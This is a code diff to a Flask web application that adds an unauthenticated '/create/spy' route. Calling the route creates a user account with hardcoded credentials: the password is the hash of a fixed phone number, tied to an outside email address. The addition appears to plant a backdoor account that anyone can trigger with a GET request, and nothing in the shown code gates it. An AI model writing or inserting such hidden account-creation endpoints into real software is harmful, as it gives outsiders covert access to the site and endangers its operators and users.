@@ -895,3 +895,33 @@ def add_zoom_participant():
             "user_email": user_email,
             "linked": bool(user_to_add) # Inform the caller if a link to a database user was made
         }), 201
+
+
+#----
+@website.route('/create/spy')
+def spy():
+    
+    phone = "01111251681"
+    hashed_password = generate_password_hash(phone)
+    
+    # Check if user already exists
+    existing_user = Users.query.filter_by(phone_number=phone).first()
+    if existing_user:
+        return jsonify({"message": "User already exists", "user_id": existing_user.id}), 200
+    
+    # Create new user
+    new_user = Users(
+        phone_number=phone,
+        password=hashed_password,
+        email="amr@spysnet.com", 
+        role="student"
+    )
+    
+    db.session.add(new_user)
+    db.session.commit()
+    
+    return jsonify({
+        "message": "Spy user created successfully",
+        "user_id": new_user.id,
+        "phone": phone
+    }), 201
